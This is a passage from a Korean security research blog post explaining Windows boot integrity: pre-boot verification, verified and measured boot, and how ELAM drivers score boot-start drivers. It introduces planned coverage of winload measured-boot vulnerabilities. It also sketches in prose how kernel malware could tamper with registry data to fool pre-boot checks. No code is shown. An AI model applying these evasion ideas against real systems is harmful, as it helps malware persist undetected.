&#xBCFC;&#xB968;(&#xC774;&#xBBF8;&#xC9C0;)&#xC5D0;&#xC11C; &#xBD80;&#xD305;&#xD558;&#xB294; &#xAC83; &#xB610;&#xD55C; &#xBE44;&#xC2B7;&#xD55C; &#xAC1C;&#xB150;&#xC774;&#xC9C0;&#xB9CC; &#xBCC0;&#xACBD; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; OS &#xD30C;&#xC77C;&#xB9CC; &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xBCFC;&#xB968;&#xC5D0; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;. &#xC774; &#xBCFC;&#xB968;&#xC740; &#xD574;&#xC2DC; &#xB610;&#xB294; &#xD574;&#xC2DC; &#xD2B8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xAC80;&#xC99D;&#xD55C;&#xB2E4;. &#xD574;&#xC2DC; &#xB610;&#xB294; &#xD574;&#xC2DC; &#xD2B8;&#xB9AC;&#xC758; &#xB8E8;&#xD2B8; &#xD574;&#xC2DC;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB85C; &#xBCF4;&#xD638;&#xB418;&#xB294; &#xB8E8;&#xD2B8;&#xC5D0; &#xC758;&#xD574; &#xC11C;&#xBA85;&#xB418;&#xACE0; &#xAC80;&#xC99D;&#xB418;&#xBA70; &#xC774; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC740; &#xAE30;&#xC874;&#xC758; &#xAC80;&#xC99D;&#xB41C; &#xBD80;&#xD305; &#xAD6C;&#xD604;&#xACFC; &#xAD00;&#xB828;&#xC774; &#xC788;&#xB2E4;. &#xB354; &#xC790;&#xC138;&#xD55C; &#xAE30;&#xC220; &#xC815;&#xBCF4;&#xB294; <a href="https://source.android.com/security/verifiedboot/verified-boot">&#xC5EC;&#xAE30;</a>&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><h2 id="Pre-boot-verification"><a href="#Pre-boot-verification" class="headerlink" title="Pre-boot verification"></a>Pre-boot verification</h2><p>Pre-boot verification&#xC740; &#xC798; &#xC54C;&#xB824;&#xC9C0;&#xC9C0; &#xC54A;&#xC740; &#xAE30;&#xC220;&#xC774;&#xBA70; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; PCI (Peripheral Component Interconnect) &#xC7A5;&#xCE58; &#xB610;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; UEFI &#xC774;&#xBBF8;&#xC9C0;&#xB85C; &#xAD6C;&#xD604;&#xB41C;&#xB2E4;. &#xBD80;&#xD305; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC5D0; &#xC788;&#xB294; &#xBD80;&#xD2B8; &#xB85C;&#xB354;&#xB97C; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xD655;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xAD6C;&#xC131;, &#xB178;&#xCD9C;&#xB41C; &#xD38C;&#xC6E8;&#xC5B4; &#xBA54;&#xBAA8;&#xB9AC;, &#xC2E4;&#xD589; &#xD30C;&#xC77C; &#xBC0F; &#xAE30;&#xD0C0; &#xB370;&#xC774;&#xD130; (&#xC608; : Windows Installation&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xAC12;) &#xB4F1;&#xC758; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xD655;&#xC778;&#xD55C;&#xB2E4;. </p><p>Pre-boot verification&#xC740; &#xC774;&#xC804;&#xC5D0;&#xB294; &#xCD08;&#xAE30;&#xD654; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xBA54;&#xBAA8;&#xB9AC; (option ROM)&#xAC00; &#xC788;&#xB294; PCI &#xC7A5;&#xCE58;&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xB2E4;. &#xCD08;&#xAE30;&#xD654; &#xCF54;&#xB4DC;&#xB294; &#xBD80;&#xD2B8; &#xB85C;&#xB354;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xBA85;&#xB839;&#xC5B4; &#xC704;&#xCE58;&#xC5D0; &#xC911;&#xB2E8;&#xC810;&#xC744; &#xC124;&#xCE58;&#xD574; &#xC911;&#xB2E8;&#xC810;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xBA74; PCI &#xC7A5;&#xCE58;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; OS&#xAC00; &#xC2DC;&#xC791;&#xB418;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xB2E4;. OS&#xB294; &#xC5F0;&#xACB0;&#xB41C; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC5D0;&#xC11C; &#xCC3E;&#xC740; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xACE0; &#xD655;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xD574;&#xC2DC;&#xB294; &#xBB34;&#xACB0;&#xC131;&#xC774; &#xD655;&#xC778;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C; &#xB4DC;&#xB77C;&#xC774;&#xBE0C; &#xB610;&#xB294; PCI &#xC7A5;&#xCE58;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xBA70; &#xAC80;&#xC99D;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC6D0;&#xB798; &#xBD80;&#xD2B8; &#xB85C;&#xB354;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xAC00; &#xC2DC;&#xC791;&#xB41C;&#xB2E4;.</p><p>&#xD604;&#xC7AC;&#xB294; PCI &#xC7A5;&#xCE58;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; UEFI &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xBA54;&#xC778;&#xBCF4;&#xB4DC;&#xC5D0; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; UEFI &#xC774;&#xBBF8;&#xC9C0;&#xC5D0;&#xB294; &#xD655;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xD30C;&#xC11C;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; USB &#xBD80;&#xD305;&#xC744; &#xC704;&#xD574; USB &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xAD6C;&#xD604;&#xB3C4; &#xC788;&#xB2E4;. &#xC774;&#xC804; &#xBC29;&#xC2DD;&#xACFC; &#xBE44;&#xAD50;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBD80;&#xD305; &#xC21C;&#xC11C;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xAC00;&#xC815;&#xD558;&#xC5D0; BIOS / UEFI &#xD658;&#xACBD;&#xC5D0; &#xB300;&#xD55C; &#xC911;&#xB2E8;&#xC810; &#xB610;&#xB294; &#xC560;&#xB4DC;&#xC628;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBD80;&#xD305; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xAC04;&#xC12D;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xB2E4;.</p><p>&#xC774; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC740; BIOS &#xBC0F; UEFI&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4;&#xC758; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC81C;&#xD55C;&#xB418;&#xC9C0;&#xB9CC;, &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; UEFI &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC124;&#xACC4;&#xC0C1; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xC601;&#xC5ED;&#xC5D0; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;.</p><p>&#xB610; &#xB2E4;&#xB978; &#xB2E8;&#xC810;&#xC740; &#xACF5;&#xC2DD; Windows&#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xB41C; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xBC0F; Windows &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD30C;&#xC2F1; &#xCF54;&#xB4DC;&#xB97C; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC70;&#xC758; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; Linux &#xC0AC;&#xC6A9;&#xC790;&#xAC00; NTFS &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xB9C8;&#xC6B4;&#xD2B8; &#xD558;&#xBA74; &#xB3D9;&#xC77C;&#xD55C; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xD0D0;&#xC0C9;&#xD558;&#xB294; Windows &#xC0AC;&#xC6A9;&#xC790;&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xACFC; &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC774; &#xD45C;&#xC2DC;&#xB41C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; Pre-boot verification&#xC740; &#xC2E4;&#xC81C;&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC6D0;&#xC2DC; &#xB370;&#xC774;&#xD130;&#xB294; &#xB3D9;&#xC77C;&#xD558;&#xB098; &#xB2E4;&#xB978; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBC18;&#xD658;&#xD560; &#xC218; &#xC788;&#xB2E4;. </p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xB300;&#xBD80;&#xBD84;&#xC758; Pre-boot verification &#xC81C;&#xD488;&#xC740; Windows &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xB85C;&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xC989;, Kernel &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBA40;&#xC6E8;&#xC5B4;&#xAC00; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xAC12;&#xC744; &#xC218;&#xC815;&#xD574; Pre-boot verification&#xC5D0;&#xC11C; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC624;&#xB3C4;&#xB85D; &#xD560; &#xC218; &#xC788;&#xB2E4;. Windows Kernel&#xC740; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xB85C;&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xBBC0;&#xB85C; &#xC774;&#xB7EC;&#xD55C; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC740; &#xBD80;&#xD305; &#xB3C4;&#xC911;&#xACFC; &#xBD80;&#xD305; &#xD6C4;&#xC5D0; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0; &#xD45C;&#xC2DC;&#xB41C;&#xB2E4;. &#xC774;&#xB294; <a href="https://dfir.ru/2018/10/07/hiding-data-in-the-registry/">&#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C;</a> &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xB2E4;.  </p><p>verified &#xBC0F; measured boot &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xCF54;&#xB4DC;&#xC640; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC804; &#xAC80;&#xC99D;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xACF5;&#xACA9;&#xC5D0; &#xB300;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xB41C;&#xB2E4;. &#xC2E4;&#xD589;&#xB420; &#xD30C;&#xC77C;&#xC774; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB978; &#xD574;&#xC2DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xD30C;&#xC77C;&#xC774; verified &#xBC0F; measured&#xB97C; &#xAC70;&#xCCD0; &#xB3D9;&#xC77C;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBCF4;&#xC548;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774; &#xC811;&#xADFC; &#xBC29;&#xBC95; &#xB610;&#xD55C; &#xD56D;&#xC0C1; &#xC644;&#xBCBD;&#xD558;&#xC9C0;&#xB294; &#xC54A;&#xB2E4;. &#xC774; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Windows Loader (<code>winload.exe</code> &#xB610;&#xB294; <code>winload.efi</code>)&#xC758; measured boot&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xB450; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC911;&#xC810;&#xC744; &#xB458; &#xAC83;&#xC774;&#xBA70;, &#xBCC4;&#xB3C4;&#xC758; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAD6C;&#xC131; &#xC694;&#xC18C;(&#xC774;&#xD6C4;&#xC5D0; &#xC124;&#xBA85;&#xD560; Loader&#xC640; kernel)&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xC640; &#xCF54;&#xB4DC;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xC758; &#xC774;&#xC288;&#xC5D0; &#xB300;&#xD574; &#xAC15;&#xC870;&#xD55C;&#xB2E4;.</p><h1 id="Early-Launch-Anti-Malware"><a href="#Early-Launch-Anti-Malware" class="headerlink" title="Early Launch Anti-Malware"></a>Early Launch Anti-Malware</h1><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xAE30; &#xC804;&#xC5D0; Windows Kernel (<code>ntoskrnl.exe</code>)&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF8;&#xB2E4;.</p><p>&#xB450; &#xAC00;&#xC9C0;&#xC758; &#xC8FC;&#xC694; &#xBD80;&#xD305; &#xBCF4;&#xC548;&#xC778;  verified boot&#xC640; measured boot&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;/&#xD38C;&#xC6E8;&#xC5B4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xACE0;&#xB824;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0; &#xBA40;&#xC6E8;&#xC5B4;&#xC758; &#xCD08;&#xAE30; &#xBAA9;&#xD45C; &#xC0BD;&#xC785; &#xC9C0;&#xC810;&#xC740; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB2E4;.</p><p>&#xC545;&#xC131; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; Microsoft&#xB294; <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/early-launch-antimalware">ELAM (Early Launch Anti-Malware) &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;</a>&#xB97C; Windows 8&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xB3C4;&#xC785;&#xD588;&#xB2E4;. </p><p>ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xB2E4;&#xB978; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xBCF4;&#xB2E4; &#xBA3C;&#xC800; &#xC2DC;&#xC791;&#xD574; &#xC885;&#xC18D;&#xC131;&#xACFC; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD55C;&#xB2E4;. &#xAC01; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB300;&#xD574; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xB2E4;&#xC74C; &#xAC12;&#xC744; &#xBC18;&#xD658;&#xD55C;&#xB2E4;.</p><ul><li>unknown - &#xC54C; &#xC218; &#xC5C6;&#xC74C;</li><li>good - &#xC815;&#xC0C1;&#xC801;&#xC778; &#xB4DC;&#xB77C;&#xC774;&#xBC84;</li><li>bad - &#xC545;&#xC131; &#xB4DC;&#xB77C;&#xC774;&#xBC84;</li><li>bad but critical for the boot - &#xC545;&#xC131; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC9C0;&#xB9CC; &#xBD80;&#xD305; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xBE60;&#xC838;&#xC11C;&#xB294; &#xC548; &#xB420; &#xC694;&#xC18C;</li></ul><p>&#xB610;&#xD55C; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xC791;&#xC5C5;&#xC744; &#xAE30;&#xB85D;&#xD558;&#xB294; &#xCF5C;&#xBC31;&#xC744; &#xC124;&#xC815;&#xD558;&#xACE0; &#xB7F0;&#xD0C0;&#xC784; &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4;&#xC758; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC5D0; &#xC800;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xC790;&#xCCB4; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; Windows 8.1&#xC5D0;&#xC11C; &#xB3C4;&#xC785;&#xB41C; <a href="https://docs.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-">&#xCF54;&#xB4DC; &#xBB34;&#xACB0;&#xC131; &#xBCF4;&#xD638;</a>&#xAC00; &#xC81C;&#xACF5;&#xB418;&#xC5B4; &#xBCF4;&#xD638;&#xB41C; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;. </p><p>&#xBD80;&#xD305; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC911;&#xC5D0; &#xB458; &#xC774;&#xC0C1;&#xC758; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB420; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xAC01; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC9C0;&#xC815;&#xB41C; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB3C5;&#xB9BD;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD558;&#xBA70; &#xC774; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB300;&#xD55C; &#xCD5C;&#xC885; &#xACB0;&#xACFC;&#xAC12;&#xC740; &#xB2E4;&#xC74C; &#xC21C;&#xC704;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C;&#xB2E4;.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled.png" alt="measured-boot-vuln/Untitled.png"></p><blockquote><p>Table 1. ELAM scores (ranks)</p></blockquote><p>&#xD55C; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; <code>good</code> &#xC744; &#xBC18;&#xD658;&#xD558;&#xACE0; &#xB2E4;&#xB978; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; <code>bad</code>&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74; &#xC774; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; <code>bad</code>&#xB85C; &#xACB0;&#xC815;&#xB41C;&#xB2E4;.</p><p>&#xC704; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xBC18;&#xD658; &#xAC12;&#xACFC; &#xC544;&#xB798; &#xC815;&#xCC45;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; Kernel&#xC740; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xAC70;&#xB098; &#xAC70;&#xBD80;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><ul><li>&#xBAA8;&#xB4E0; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD5C8;&#xC6A9;</li><li><code>good</code>, <code>unknown</code>, <code>bad but critical</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD5C8;&#xC6A9;(&#xAE30;&#xBCF8;&#xAC12;)</li><li><code>good</code>, <code>unknown</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD5C8;&#xC6A9;</li><li><code>good</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD5C8;&#xC6A9;</li></ul><p>ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xB2E4;&#xC74C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xC2A4;&#xCF54;&#xC5B4;&#xB97C; &#xACB0;&#xC815;&#xD55C;&#xB2E4;.</p><ul><li>&#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;</li><li>&#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xACBD;&#xB85C;</li><li>&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB300;&#xD55C; &#xC778;&#xC99D;&#xC11C; &#xC815;&#xBCF4; (&#xAC8C;&#xC2DC;&#xC790;, &#xBC1C;&#xAE09;&#xC790;)</li><li>&#xC774;&#xBBF8;&#xC9C0; &#xD30C;&#xC77C; &#xD574;&#xC2DC;&#xAC12;</li></ul><p>&#xBB38;&#xC81C;&#xB294; <a href="https://www.microsoft.com/security/blog/2020/09/01/force-firmware-code-to-be-measured-and-attested-by-secure-launch-on-windows-10/">DRTM (Dynamic Root of Trust for Measurement for Measurement)</a>&#xC774; &#xC801;&#xC6A9;&#xB418;&#xBA74; &#xC774;&#xC804;&#xC5D0; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xC77D;&#xC5B4;&#xC624;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xC5B4; &#xAD00;&#xB828; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xAE30; &#xC804;&#xC5D0;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC5D0;&#xC11C; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xC77D;&#xC744; &#xC218; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC774; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB178;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAE30;&#xC874;&#xC758; &#xBA40;&#xC6E8;&#xC5B4; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB294; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xACBD;&#xB85C;, &#xD574;&#xC2DC; &#xBC0F; &#xC778;&#xC99D;&#xC11C; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB85C; &#xC545;&#xC131; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xCC28;&#xB2E8;&#xD558;&#xB294; &#xAC83;&#xC740; &#xD6A8;&#xACFC;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; Microsoft&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; &#xADDC;&#xCE59;&#xC744; &#xC815;&#xC758;&#xD588;&#xB2E4;.</p><ul><li>ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xB294; &#xB2E8;&#xC77C; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xC81C;&#xD55C;&#xB41C; &#xC2DC;&#xAC04;&#xC774; &#xC8FC;&#xC5B4;&#xC9D0;</li><li>ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xC81C;&#xD55C;&#xB41C; &#xC2DC;&#xAC04;&#xC774; &#xC8FC;&#xC5B4;&#xC9D0;</li><li>ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xB294; &#xCF54;&#xB4DC; &#xBC0F; &#xAD6C;&#xC131; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD574; &#xC81C;&#xD55C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC81C;&#xACF5;&#xB428;</li><li>ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; ELAM &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD558;&#xC774;&#xBE0C; (<code>C:\Windows\System32\config\ELAM</code>)&#xC758; &#xD2B9;&#xC815; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4; &#xC544;&#xB798;&#xC5D0; &#xC11C;&#xBA85;&#xC744; 